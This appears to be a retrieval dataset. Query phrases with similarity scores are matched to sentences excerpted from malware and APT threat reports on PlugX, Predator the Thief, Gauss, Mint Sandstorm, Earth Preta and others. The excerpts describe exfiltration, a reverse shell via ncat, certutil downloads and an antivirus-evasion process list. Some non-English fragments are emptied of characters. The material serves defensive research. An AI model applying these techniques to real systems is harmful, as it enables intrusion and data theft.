takes a screenshot|0.7816291878477701|['The following table groups the binaries in different families and details their general characteristics.', 'Category Description Downloader Downloads executables from C&C and executes them.', 'Document Searches and uploads documents (csv, pdf, doc, docx, xlsx, etc) found in the trash uploader and in the My Documents folder.', 'System Sends information about the infected system to the C&C using GET requests.', 'It uses information WMI to gather information on the infected system such as: Antivirus installed on gathering machine; OS version; Presence of files to upload Keylogger Records keystrokes and sends log to attacker server using POST requests.', 'Screenshot Takes a screenshot of the desktop and sends it to the C&C.', 'Connect-back Continually tries to connect back to an hardcoded IP address and allows the attacker shell to open a remote command shell.', 'Public Tools We found two public tools (WebPassView and Mail PassView) from NirSoft and signed by the malicious certificate.', 'These legitimate tools can be used to recover passwords used in email clients or stored in browsers.', '5/11Self- Monitors removable drive insertion events and copies different malware files to the replication inserted drive.', 'It tries to lure the user into executing one of the copied files by through renaming it with an existing folder name and hiding the latter.']
takes a screenshot|0.7581223707025877|['For example, there is a post on anti-disassembly tricks and their implementation is C/C++ code.', 'Some methods which are implemented in Predator to harden the analysis are described in this article.', 'Sources used in this publication reside in authors GitHubhttps://github.com/Alexuiop1337/AntiDisassemblyIt appears that the author puts some love in his creation as well as in what hes doing overall.PanelWe were able to obtain Predator the Thief panel source code which helped us to gather more information.Panel interface looks like this:It is in Russian which once again proves its origin.The author of certain panel scripts identifies himself as melloy:* author of this script MelloyPanel is written in PHP while malware is written in C++.', 'There is nothing controversy in the ability to write code in both languages, however we cant say for sure that the author of Predator and the author of its panel is the same person.Links with the actorsThe table below contains resources which are linked with the authors of Predator the Thief.Judging by avatars in Twitter and VK, we can say that people (or a single person) behind the accounts like anime girls:Avatar of the malware author in TwitterPage of the malware author in VKWe cant say for sure that both malware and panel were written by the same person though certain patterns from these leads match:Prefix Alex in a nicknameAnime girl in the avatarTechnical detailsMalware flowThe entire malicious job is conducted in the address space of original executable.', 'Several layers of unpacking and XOR-decryption are performed until main payload is reached.FunctionalityMalware steals data of various browsers, email clients, crypto-wallets and other software.', 'It also takes desktop screenshot.', 'This information is stored in ZIP archive which resides in memory and then sent to C2C.What it is targetingIt steals credentials from various applications:Browser and email clientsChrome based browsersFirefox based browsersOperaOutlookThunderbirdCrypto-wallets(any crypto-system which stores `wallet.dat` is affected)ArmoryAtomicBytecoinElectrumEthereumJaxxMultiBitOther software and accountsAuthyBattleNetDiscordJabberNordVPNOsuPidginSkypeSteamTelegramWinFTPWinSCPIt also gets system information (clipboard included) in the following manner:As a final touch, Predator the Thief grabs the list of installed software and takes desktop screenshot.The data is archived and is organized like shown in the following screenshot:Mutex creationSome recent versions of Predator the Thief create mutex with name transformed from disk volume serial number.Anti-debug techniquesPredator the Thief implements various techniques to harden the analysis.1.', 'Hiding thread from debuggerCurrent thread is hidden from debugger with the call ofNtSetThreadInformationandHideFromDebuggerenum argument (11h):In order to bypass this detection method, we have to skip the call and return 0 (STATUS_SUCCESS) as a result.Here lies another trap.', 'There is another call right after this call.', 'This time with slightly different arguments:Note the difference in 3rdand 4tharguments which should be set to NULLs in order for the function to be executed correctly.', 'If wrong arguments are passed, then 0xC0000004 error code is returned.']
screen|0.8116875842879056|['Analysis Report (TLP:WHITE) Analysis of a PlugX variant (PlugX version 7.0) Conducted by CIRCL - Computer Incident Response Center Luxembourg Team CIRCL March 29, 2013 Document version: 1.0CCCIIIRRRCCCLLL --- CCCooommmpppuuuttteeerrr IIInnnccciiidddeeennnttt RRReeessspppooonnnssseee CCCeeennnttteeerrr LLLuuuxxxeeemmmbbbooouuurrrggg MMMaaarrrccchhh 222999,,, 222000111333 Contents 1 Scope of work 3 2 Analyzed samples 3 2.1 Limitations .', '.', '.', '.', '.', '.', '.']
screen|1.0|['how the service actually communicates, These systems either werent or cant be providing an efficient way to find systems upgraded to newer versions and that means that could be stuck with a version of roughly one out of every six TLS services OpenSSL that will never see a new version.', 'is using a library that will no longer receive security updates.', 'Figure 29: Top 5 fingerprinted TLS stacks.', 'Microsoft Schannel 26.64% Roughly one out of every six TLS services is using a OpenSSL 1.1.x 15.74% library that will no longer receive security updates.', 'BoringSSL 2.29% Go crypto/tls 1.12.0 to 1.20.x 2.09% OpenSSL 3.x 2.05% 20 P runZero Research Report 24 58The Remote Desktop Protocol In the early 2000s, Microsofts Remote With the release of Windows 2003 Service Desktop Services (RDS, then called Pack 1, Microsoft introduced the ability Terminal Services), presented a few security to use TLS, which addressed the issue of challenges: clients couldnt validate the machine-in-the-middle (MitM) attacks servers identity, there was no brute force by allowing clients to cryptographically prevention, and unauthenticated users verify they were connecting to the could connect and observe the login expected server.', 'screen.', 'The login screen often displayed a default username and the domain that the In Windows Server 2008, Microsoft server was part of.', 'This information could introduced Network Level Authentication then be used in brute force attacks.', '(NLA), which required users to authenticate themselves before a session would be established.', 'NLA forced authentication Figure 30: Microsofts Remote Desktop to occur after the TLS handshake, but Services login screen.', 'before the console was provisioned, which mitigated the resource-exhaustion concerns, reduced information leakage, and significantly impaired brute-force attacks.']
screen|0.8035790719068453|['File Upload Upload files from the device.', 'Use root to copy files the app doesnt have access to.', 'Log Enable/disable verbose logging.', 'Exfiltrate notification content.', 'Notification Dismiss/snooze notifications that Listener reference, but dont originate from, the Hermit app.', 'Screen Take pictures of the screen.', 'Use root to run screencap Capture Use root to silently uninstall/reinstall Telegram.', 'Also Prompt the user to reinstall Telegram on Telegram copy the old apps data to the new apps folder, the device with a downloaded APK.', 'changing the files SELinux contexts and owners Prompt the user to reinstall WhatsApp WhatsApp via Play Store.', 'Lookout Threat Lab researchers have uncovered enterprise-grade Android surveillanceware used by the government of Kazakhstan within its borders.', 'While weve been following this threat for a while using Lookout Endpoint Detection and Response (EDR) these latest samples were detected in April 2022, four months after nation-wide protests against government policies were violently suppressed.']
screen|1.0|['Disable Check for Updates and click Done.', 'Click Restart when activation completes then click Get Started.', 'Enter your password if prompted.', 'Select desired language and region.', 'Apply any pending updates and modify the following within System Settings.', 'Click Not Now in the Accessibility screen.', 'Bluetooth: Disable Bluetooth Click Continue without selecting a Wi-Fi network.', 'Network > Firewall: Enable Firewall Click Continue to confirm your choice.', 'Notifications > Show Previews: Never Click Continue on Data and Privacy screen.', 'Notifications: Disable Allow notifications when the Click Not Now at the Migration Assistant.', 'screen is locked Click Agree to the Terms and Conditions and confirm Notifications > Each app: Disable Agree.']
Upload, download|0.7725429938532279|['Although our analysis and attribution efforts are ongoing, we have discovered some indicators that suggest the threat actor may be a Chinese group.', 'The campaigns The APT group has launched at least four campaigns since late February, using a variety of lures, detailed below.', '1.', 'Interactive map of Ukraine The threat actor started this campaign around February 26, 2022, and distributed its custom malware with the name interactive_map_UA.exe, trying to disguise it as an interactive map of Ukraine.', 'This campaign began a few days after Russia invaded Ukraine, which shows the threat actor was monitoring the situation between Ukraine and Russia and took advantage of it to lure targets in Russia.', '2.', 'Log4j patch In this campaign the threat actor packaged its custom malware in a tar file called Patch_Log4j.tar.gz, a fake fix for Decembers high-profile Log4j vulnerability.', 'This campaign ran in early March and was primarily aimed at RT TV (formerly Russia Today or Rossiya Segodnya, a Russian state-controlled international television network funded by the Russian government).', 'The APT group had access to almost 100 RT TV employees email address.', 'The emails were sent with the subject .', '.']
Upload, download|0.8686500073530549|['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 2022.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C) appears to be a curriculum 4/17vitae (similar to a resume) of an individual named Roshan.']
Upload, download|0.8880095466174223|['command codes in the MargualsRAT indicating that this RAT is actively in development by the attackers.', 'ALLAKORE Allakore is a publicly available Delphi- based RAT that has consistently been used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Allakore include: Keylogging.', 'Capture screenshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change wallpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Command handler of MargulasRAT.', 'containing a limited set of capabilities.']
record keystrokes|0.7530776271391626|['Dropper Extract, install and potentially launch or execute one or more malware files.', 'Credential Stealer Access, copy or steal authentication credentials.', 'Point of Sale (POS) Obtain payment card information.', 'Ransomware Perform some malicious action (most often data encryption), with the goal of denying access until a ransom is paid.', 'Other Includes keyloggers, rootkits, bootkits and utilities.', 'Keyloggers record keystrokes.', 'Rootkits hide other malware.', 'Bootkits are embedded deep in a systems boot process.', 'Utilities are tools and supporting files that perform functions such as clearing log files.SPECIAL REPORT M-TRENDS 2020 31 File Type The file format or file structure of malware may indicate the architecture or operating system the attacker was targeting.', 'Although most of the samples Figure 6. analyzed were Portable Executable (PE) files, we had four Linux families (Fig.', '6).']
delete files.|0.7800566784932201|"['stop Stop a service.', 'pause Pause a service.', 'continue Make a paused service resume execution.', 'create Create a new service.', 'config Change configuration for a service.', 'delete Delete a service.', 'desc Change the description of a service.', 'To get help for a specific command use: %s {command} -h sinfo System information sinfo Usage: sinfo [-a] For any inquiries, contact intelreports@kaspersky.com Page 18 of 33The ProjectSauron APT.', 'Technical analysis -a Show volume information for all drives (removable, network etc).', ""Warning, use this option with care since it causes cdrom-spinup, little network traffic and floppy-noise skip Filter the input lines from stdout and print only those that contain (or do not contain, depending on the command line switches) the particular substring sl Port scanner with TCP/UDP/ICMP support sl [-?bhijnMpPrTUvVz] [-cdDgmq <n>] [-tu <n>[,<n>-<n>]] IP[,IP-IP] (use a single '-' character to read ip's from stdin) -?"", '- Shows this help text -b - Get port banners -c - Timeout for TCP and UDP attempts (ms).']"
delete files.|1.0000000000000002|"['Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".', 'Delete files.']"
TeamViewer|1.0|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"Payload
Obfuscation"|0.8147215960238209|['ESET Research White papers // July 2019 MACHETE JUST GOT SHARPER Venezuelan military under attack How spies managed to steal gigabytes of confidential data over the course of a yearTABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']
HTTP C2 Communication|0.7717244508068806|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users,|0.816629350169493|['In cases where Mint Sandstorm operators continue their pursuit of a given target, Microsoft typically observes one of two possible attack chains.', '2/8Figure 1.', 'The two attack chains used by the Mint Sandstorm subgroup Attack chain 1: The Mint Sandstorm subgroup proceeds using Impacket to move laterally through a compromised organization and relies extensively on PowerShell scripts (rather than custom implants) to enumerate admin accounts and enable RDP connections.', 'In this attack chain, the subgroup uses an SSH tunnel for command and control (C2), and the final objective in many cases is theft of the Active Directory database.', 'If obtained, the Mint Sandstorm subgroup can use the Active Directory database to access credentials for users accounts.', 'In cases where users credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users, possibly without attracting attention from defenders.', 'The actors could also gain access to other systems where individuals may have reused their passwords.', 'Attack chain 2: As is the case in attack chain 1, the Mint Sandstorm subgroup uses Impacket to move laterally.', 'However, in this progression, the operators use webhook.site for C2 and create scheduled tasks for persistence.', 'Finally, in this attack chain, the actors deploy a custom malware variant, such as Drokbk or Soldier.', 'These custom malware variants signal an increase in the subgroups level of sophistication, as they shift from using publicly available tools and simple scripts to deploying fully custom developed malicious code.']
credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users,|0.816629350169493|['In some cases, the subgroup does not act on the information they collect, possibly because they assess that a victim does not meet any targeting requirements or because the subgroup wishes to wait and focus on more valuable targets.', 'In cases where Mint Sandstorm operators continue their pursuit of a given target, Microsoft typically observes one of two possible attack chains.Figure 1.', 'The two attack chains used by the Mint Sandstorm subgroupAttack chain1:The Mint Sandstorm subgroup proceeds using Impacket to move laterally through a compromised organization and relies extensively on PowerShell scripts (rather than custom implants) to enumerate admin accounts and enable RDP connections.', 'In this attack chain, the subgroup uses an SSH tunnel for command and control (C2), and the final objective in many cases is theft of the Active Directory database.', 'If obtained, the Mint Sandstorm subgroup can use the Active Directory database to access credentials for users accounts.', 'In cases where users credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users, possibly without attracting attention from defenders.', 'The actors could also gain access to other systems where individuals may have reused their passwords.Attack chain2: As is the case in attack chain 1, the Mint Sandstorm subgroup uses Impacket to move laterally.', 'However, in this progression, the operators usewebhook.sitefor C2 and create scheduled tasks for persistence.', 'Finally, in this attack chain, the actors deploy a custom malware variant, such as Drokbk or Soldier.', 'These custom malware variants signal an increase in the subgroups level of sophistication, as they shift from using publicly available tools and simple scripts to deploying fully custom developed malicious code.Since 2022,Microsoft has observed this Mint Sandstorm subgroup using two custom implants, detected by Microsoft security products as Drokbk and Soldier, to persist in target environments and deploy additional tools.', 'Drobkbk and Soldier both use Mint Sandstorm-controlled GitHub repositories to host a domain rotator containing the operators C2 domains.']
The actors could also gain access to other systems where individuals may have reused their passwords.|1.0|['2/8Figure 1.', 'The two attack chains used by the Mint Sandstorm subgroup Attack chain 1: The Mint Sandstorm subgroup proceeds using Impacket to move laterally through a compromised organization and relies extensively on PowerShell scripts (rather than custom implants) to enumerate admin accounts and enable RDP connections.', 'In this attack chain, the subgroup uses an SSH tunnel for command and control (C2), and the final objective in many cases is theft of the Active Directory database.', 'If obtained, the Mint Sandstorm subgroup can use the Active Directory database to access credentials for users accounts.', 'In cases where users credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users, possibly without attracting attention from defenders.', 'The actors could also gain access to other systems where individuals may have reused their passwords.', 'Attack chain 2: As is the case in attack chain 1, the Mint Sandstorm subgroup uses Impacket to move laterally.', 'However, in this progression, the operators use webhook.site for C2 and create scheduled tasks for persistence.', 'Finally, in this attack chain, the actors deploy a custom malware variant, such as Drokbk or Soldier.', 'These custom malware variants signal an increase in the subgroups level of sophistication, as they shift from using publicly available tools and simple scripts to deploying fully custom developed malicious code.', 'Use of custom tools to evade detection Since 2022,Microsoft has observed this Mint Sandstorm subgroup using two custom implants, detected by Microsoft security products as Drokbk and Soldier, to persist in target environments and deploy additional tools.']
Scheduled Task Creation or|0.7603368825878054|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
gather information on an infected host, and send details back to the attackers.|0.7606509533932341|['The PDF contains a link to a macro-enabled template file (dotm) hosted on Dropbox.', 'This file has been weaponized with macros to perform remote template injection, a technique that allows operators to obtain and launch a payload from a remote C2, often OneDrive.', 'Template injection is an attractive option for adversaries looking to execute malicious code without drawing scrutiny from defenders.', 'This technique can also be used to persist in a compromised environment if an adversary replaces a default template used by a common application.', 'In these attacks, Microsoft has observed the Mint Sandstorm subgroup using CharmPower, a custom implant, in attacks that began with targeted phishing campaigns.CharmPower is a modular backdoor written in PowerShell that this subgroup delivers in phishing campaigns that rely on template injection.', 'CharmPower can read files, gather information on an infected host, and send details back to the attackers.', 'Reporting from Checkpoint indicates that at least one version of CharmPower pulls data from a specific text file that contains a hardcoded victim identifier.', 'Figure 2.', 'Template injection technique Whats next Capabilities observed in intrusions attributed to this Mint Sandstorm subgroup are concerning as they allow operators to conceal C2 communication, persist in a compromised system, and deploy a range of post-compromise tools with varying capabilities.', 'While effects vary depending on the operators post-intrusion activities, even initial access can enable unauthorized access and facilitate further behaviors that may adversely impact the confidentiality, integrity, and availability of an environment.', 'A successful intrusion creates liabilities and may harm an organizations reputation, especially those responsible for delivering services to others such as critical infrastructure providers, which Mint Sandstorm has targeted in the past.']
packed using NSIS installer.|0.7876822244776891|"['[ 5-1]  ESRC    .', ', [ ]  .', '[ ]   wmic os get   FTP (search.greenulz[.', ']com) .', ""[ 6]   [ 7]   ESRC  'XSL Script Processing'         ."", '.', ',     .', '(ALYac)         .']"
malware rzlog4cpp.dll is sideloaded|0.7656954162725007|['HIUPAN and ACNSHELL infection flow The USB Driver.exe program first sideloads u2ec.dll, which then loads the payload file usb.ini.', 'They have the following PDB strings, respectively: G:\\\\project\\\\APT\\\\U\\\\new\\\\u2ec\\\\Release\\\\u2ec.pdb G:\\\\project\\\\APT\\\\U\\\\new\\\\shellcode\\\\Release\\\\shellcode.pdb The string U means U disk hijacking, where U disk refers to removable drives.', '12/42USB Driver.exe then starts checking whether it is properly installed.', 'If it is installed, it will start to infect more removable disks and copy files to a folder named autorun.inf.', 'If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence.', 'Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded.', 'It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com.', 'Command and Control (C&C) stage Earth Preta employed several tools and commands for the C&C stage.', 'For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91.', 'Figure 19.', 'The certutil.exe program downloads the WinRAR binary We also observed that the threat actors used PowerShell to download multiple malware and archives from the server 103[.]159[.]132[.']
Once the malicious DLL is sideloaded, it will drop the legitimate EXE file and the malicious DLL file, which are embedded in the resource section of the DLL file.|1.0000000000000002|['Windows users in 38[.]54[.]33[.', ']228 While hunting samples related to this campaign, we came across a tweet about Cobalt Strike posted in April 2021.', 'At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task.', '35/42Figure 49.', 'A tweet about Cobalt Strike The infection flow is as follows: The archive file is delivered through a Google Drive link, which contains a legitimate EXE file, a malicious DLL file, and a decoy document written in Burmese.', 'Once the malicious DLL is sideloaded, it will drop the legitimate EXE file and the malicious DLL file, which are embedded in the resource section of the DLL file.', 'In this sample, the string By:Taozongjie is being used as the event name.', '36/42Figure 50.', 'Infection flow of Cobalt Strike 37/42Figure 51.', 'Special string in the sample In one TONEINS sample (SHA256: 7436f75911561434153d899100916d3888500b1737ca6036e41e0f65a8a68707), we also observed the string taozongjie, which was being used for an event name.', 'Figure 52.']
Once the malicious DLL is sideloaded, it will drop the legitimate EXE file and the malicious DLL file, which are embedded in the resource section of the DLL file.|1.0000000000000002|['Here, we found that one of the Windows users was called TaoZongjie.Figure 48.', 'Windows users in 38[.]54[.]33[.', ']228While hunting samples related to this campaign, we came across atweetabout Cobalt Strike posted in April 2021.', 'At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task.Figure 49.', 'A tweet about Cobalt StrikeThe infection flow is as follows: The archive file is delivered through a Google Drive link, which contains a legitimate EXE file, a malicious DLL file, and a decoy document written in Burmese.', 'Once the malicious DLL is sideloaded, it will drop the legitimate EXE file and the malicious DLL file, which are embedded in the resource section of the DLL file.', 'In this sample, the stringBy:Taozongjieis being used as the event name.Figure 50.', 'Infection flow of Cobalt StrikeFigure 51.', 'Special string in the sampleIn one TONEINS sample (SHA256:7436f75911561434153d899100916d3888500b1737ca6036e41e0f65a8a68707), we also observed the stringtaozongjie, which was being used for an event name.Figure 52.', 'Create event taozongjie in TONEINSIn another TONESHELL sample (SHA256:d950d7d9402dcf014d6e77d30ddd81f994b70f7b0c6931ff1e705abe122a481a), there are some insignificant export functions, which will appear via message boxes, with the stringsTaoorzhang!.', 'Even though the names of these two strings are not spelled exactly same way astaozongjie, their spellings are still similar.Figure 53.']
an encrypted configuration.|0.8315295146963511|['It writes itself in files: and modifies the %system32%\\\\wbem\\\\wmiqry32.dll, %system32%\\\\wbem\\\\wmihlp32.dll system registry to be loaded instead of file.', '%system32%\\\\wbem\\\\wbemsvc.dll To achieve this, it writes the following registry value: [HKCR\\\\CLSID\\\\{7C857801-7381-11CF-884D-00AA004B2E24}\\\\InProcServer32] Default = %system32%\\\\wbem\\\\wmihlp32.dll Operation The module is automatically loaded into processes that use wbemsvc.dll.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShellHWStop, Global\\\\ShellHWDetectionEvent events, mutex ShellHWDetectionMutex.', '12The main thread exits if the following processes were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwall.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lookout.exe savprogress.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHook.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Sniffer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe sppfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewallsvc.exe ssupdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgaccount.exe CavAUD.exe ipatrol.exe webwall.exe privatefirewall3.exe CavEmSrv.exe pcipprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rtt_crc_service.exe Cavvl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavApp.exe privatefirewall3.exe avas.exe sdtrayapp.exe CavCons.exe pfft.exe avcom.exe siteadv.exe CavMud.exe armorwall.exe avkproxy.exe sndsrvc.exe CavUMAS.exe app_firewall.exe avkservice.exe snsmcon.exe UUpd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4ss.exe avtask.exe avkwctl.exe CavQ.exe tppfdmn.exe aws.exe firewall.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rsser.exe bgnt.exe spybotsd.exe OnAccessInstaller.exe op_mon.exe bootsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bullguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewall.exe Packetyzer.exe wwasher.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13zerospywarelite_installer.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewall.exe ashdisp.exe rawshark.exe vdtask.exe firewall2004.exe ashmaisv.exe Ethereal.exe asr.exe firewallgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of additional modules, their names, DLL exports names to call and location of the modules additional files.', 'Gauss ShellNotifyUser ShellNotifyUserEx SetWindowEvent InitShellEx %systemroot%\\\\system32\\\\winshell.ocx %temp%\\\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\\\system32\\\\dskapi.ocx %temp%\\\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\\\system32\\\\smdk.ocx %temp%\\\\~mdk.tmp String values from config file (example) 14Every module is loaded and its export functions are called as specified in the configuration.', 'Most of the actions are logged in an encrypted (with XOR) file %temp%\\\\~shw.tmp.', 'Sample of decrypted ~shw.tmp After loading additional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction loop.', 'Prior to communicating with the C&C, all the information from the other modules log files is copied to the ~shw.tmp file.']
an encrypted configuration.|0.8315295146963511|['It is possible that during initial infection, only the ShellHW component is installed, which then installs the other modules.ShellHW (file name wmiqry32.dll/wmihlp32.dll) is the main component of the malware which ensures that all other Gauss modules are loaded when the malware starts and operate correctly.Comparison with FlameAs we mentioned above, there are significant similarities in code and architecture between Gauss and Flame.', 'In fact, it is largely due to these similarities that Gauss was discovered.', 'We created the following table for a clearer understanding of these facts and proof of kinship between the two attack platforms:FeatureFlameGaussModular architectureYesYesUsing kernel driversNoNo.OCX files extensionsYesYesConfiguration settingsPredefined in main bodyStored in registryDLL injectionsYesYesVisual C++YesYesEncryption methodsXORXORUsing USB as storageYes (hub001.dat)Yes (.thumbs.db)Embedded LUA scriptingYesNoBrowser history/cookies stealerYes (soapr32/nteps32)Yes (winshell)CVE2010-2568 (.LNK exploit)Yes (target.lnk)Yes (target.lnk)C&C communicationhttpshttpsLog files/stolen data stored in %temp%YesYesZlib compression of collected dataYesYesIn addition to the features listed above, there are considerable similarities in the operation of the Flame and Gauss C&C servers.', 'The relevant analysis is provided in the C&C Communication section.There are more similarities in the code and data of the modules:Wmiqry32/Wmihlp32.dll aka ShellHWInstalled by: Unknown dropperOperates in two modes: installation and normal operation.File names%system32%wbemwmiqry32.dll%system32%wbemwmihlp32.dllSome known MD5C3B8AD4ECA93114947C777B19D3C605908D7DDB11E16B86544E0C3E677A60E10055AE6B8070DF0B3521D78E1B8D2FCE4FA54A8D31E1434539FBB9A412F4D32FF01567CA73862056304BB87CBF797B89923D956C297C67D94F591FCB574D9325FImage Size258 048 bytesNumber of resources7Resources121, 131, 141, 151, 161, 171, 181Date of compilationJun 1 2011Jul 16 2011Jul 18 2011Sep 28 2011Oct 20 2011Related files%temp%~shw.tmp%temp%~stm.tmpInstallationThe module checks if it was loaded by lsass.exe process and, if true, proceeds with the installation.It writes itself in files: %system32%wbemwmiqry32.dll, %system32%wbemwmihlp32.dll and modifies the system registry to be loaded instead of %system32%wbemwbemsvc.dll file.To achieve this, it writes the following registry value:[HKCRCLSID{7C857801-7381-11CF-884D-00AA004B2E24}InProcServer32] Default = %system32%wbemwmihlp32.dllOperationThe module is automatically loaded into processes that use wbemsvc.dll.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.The module creates ShellHWStop, GlobalShellHWDetectionEvent events, mutex ShellHWDetectionMutex.The main thread exits if the following processes were found at its 